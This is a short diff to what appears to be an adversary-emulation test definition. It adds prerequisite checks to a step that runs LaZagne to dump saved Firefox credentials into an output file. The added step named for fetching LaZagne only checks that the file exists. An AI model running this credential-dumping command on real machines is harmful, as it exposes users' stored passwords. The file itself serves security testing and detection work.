@@ -23,6 +23,12 @@ requirements:
     platforms:
         - os: linux
 steps:
+    - name: Get Lazagne from Github and install requirements
+      inline: 'test -f #{lazagne_path}/laZagne.py'
+      executor: sh
+    - name: Needs git, python3 and some pip stuff
+      inline: which git && which python3 && which pip
+      executor: sh
     - name: lazagne.py---dump-credentials-from-firefox-browser
       inline: python3 {{.Args.lazagne_path}}/laZagne.py {{.Args.specific_module}} >> {{.Args.output_file}}
       executor: sh
